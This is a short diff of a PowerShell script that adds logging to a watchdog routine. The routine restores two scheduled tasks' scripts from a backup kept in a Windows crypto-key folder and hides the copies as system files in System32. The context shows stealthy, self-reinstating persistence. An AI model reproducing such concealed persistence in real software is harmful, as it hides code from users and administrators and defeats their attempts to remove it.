@@ -35,7 +35,9 @@ $backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
 $restoreDir = "$env:windir\System32\Com\en-US"
 
 if ($task1 -like "*ERROR: The system cannot find the file specified*") {
+    Write-Host "[+] Task WinUserCheck is missing – restoring..."
     if (-not (Test-Path "$restoreDir\sys_usr.ps1")) {
+        Write-Host "[+] sys_usr.ps1 is missing – restoring from backup"
         Copy-Item "$backupPath\win_ux.ps1" "$restoreDir\sys_usr.ps1" -Force
         attrib +h +s "$restoreDir\sys_usr.ps1"
     }
@@ -44,7 +46,9 @@ if ($task1 -like "*ERROR: The system cannot find the file specified*") {
 }
 
 if ($task2 -like "*ERROR: The system cannot find the file specified*") {
+    Write-Host "[+] Task WinWindowKill is missing – restoring..."
     if (-not (Test-Path "$restoreDir\sys_win.ps1")) {
+        Write-Host "[+] sys_win.ps1 is missing – restoring from backup"
         Copy-Item "$backupPath\win_ui.ps1" "$restoreDir\sys_win.ps1" -Force
         attrib +h +s "$restoreDir\sys_win.ps1"
     }
